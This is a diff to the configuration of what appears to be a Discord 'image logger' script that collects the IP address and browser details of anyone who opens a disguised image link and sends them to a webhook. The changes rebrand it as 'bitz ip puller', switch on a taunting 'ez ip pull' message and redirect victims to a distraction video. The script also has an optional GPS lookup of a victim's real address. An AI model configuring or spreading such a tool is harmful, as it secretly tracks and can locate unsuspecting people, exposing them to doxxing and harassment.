@@ -7,10 +7,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "snatch blue"
+__app__ = "bitz ip puller"
 __description__ = "just an info collecting tool"
 __version__ = "v1.0"
-__author__ = "fishyramen"
+__author__ = "ixabitz"
 
 config = {
     # BASE CONFIG #
@@ -20,7 +20,7 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "snatch blue", # Set this to the name you want the webhook to have
+    "username": "bitz ip puller", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -29,8 +29,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "ez ip pull", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -52,8 +52,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://bigrat.monster/" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://cdn.mtdv.me/video/distracted.mp4" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
